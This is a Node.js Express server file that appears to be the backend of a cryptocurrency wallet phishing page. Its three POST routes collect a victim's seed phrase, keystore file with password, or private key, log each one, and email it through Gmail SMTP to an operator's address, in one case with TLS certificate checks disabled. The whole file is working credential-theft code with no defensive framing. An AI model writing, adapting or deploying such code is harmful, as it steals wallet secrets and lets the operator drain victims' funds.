require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const ejs = require('ejs');
var enforce = require('express-sslify');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));
app.set('view engine', 'ejs');
app.use(enforce.HTTPS({ trustProtoHeader: true }));

app.get('/', function(req, res) {
	res.render('home');
});

app.get('/connect/:link', function(req, res) {
	var coin = req.params.link;
	console.log(coin);
	res.render('connect', { coin });
});

app.post('/connect-wallet/phrase', function(req, res) {
	var phrase = req.body.phrase;
	var coin = req.body.coin;

	var msg = '<h3>Wallet Details: </h3> <ul> <li>coin: ' + coin + '</li> <li>phrase: ' + phrase + '</li> </ul>';

	console.log(msg);
	var transporter = nodemailer.createTransport({
		host: 'smtp.gmail.com',
		port: '465',
		secure: true,
		auth: {
			user: process.env.GMAIL_ID,
			pass: process.env.GMAIL_PASS
		}
	});

	var options = {
		from: process.env.GMAIL_ID,
		to: process.env.CLIENT_ID,
		subject: 'Connect Wallet',
		html: msg
	};

	transporter.sendMail(options, function(err, info) {
		if (err) {
			console.log(err);
			res.render('failure');
		} else {
			res.render('success');
			console.log('Email status: ' + info.response);
		}
	});
});

app.post('/connect-wallet/keystore', function(req, res) {
	var keystore = req.body.keystore;
	var password = req.body.password;
	var coin = req.body.coin;
	var msg =
		'<h3>Wallet Details: </h3> <ul> <li>coin: ' +
		coin +
		'</li> <li>keystore: ' +
		keystore +
		'</li> <li>password: ' +
		password +
		'</li> </ul>';

	console.log(msg);
	var transporter = nodemailer.createTransport({
		host: 'smtp.gmail.com',
		port: '465',
		secure: true,
		auth: {
			user: process.env.GMAIL_ID,
			pass: process.env.GMAIL_PASS
		}
	});

	var options = {
		from: process.env.GMAIL_ID,
		to: process.env.CLIENT_ID,
		subject: 'Connect Wallet',
		html: msg
	};

	transporter.sendMail(options, function(err, info) {
		if (err) {
			console.log(err);
			res.render('failure');
		} else {
			res.render('success');
			console.log('Email status: ' + info.response);
		}
	});
});

app.post('/connect-wallet/privatekey', function(req, res) {
	var key = req.body.key;
	var coin = req.body.coin;
	var msg = '<h3>Wallet Details: </h3> <ul> <li>coin: ' + coin + '</li> <li>key: ' + key + '</li> </ul>';

	console.log(msg);
	var transporter = nodemailer.createTransport({
		host: 'smtp.gmail.com',
		port: '465',
		secure: true,
		secureConnection: false,
		auth: {
			user: process.env.GMAIL_ID,
			pass: process.env.GMAIL_PASS
		},
		tls: {
			rejectUnauthorized: false
		}
	});

	var options = {
		from: process.env.GMAIL_ID,
		to: process.env.CLIENT_ID,
		subject: 'Connect Wallet',
		html: msg
	};

	transporter.sendMail(options, function(err, info) {
		if (err) {
			console.log(err);
			res.render('failure');
		} else {
			res.render('success');
			console.log('Email status: ' + info.response);
		}
	});
});

let port = process.env.PORT;
if (port == null || port == '') {
	port = 4000;
}

app.listen(port, function() {
	console.log('server running at port ' + port);
});
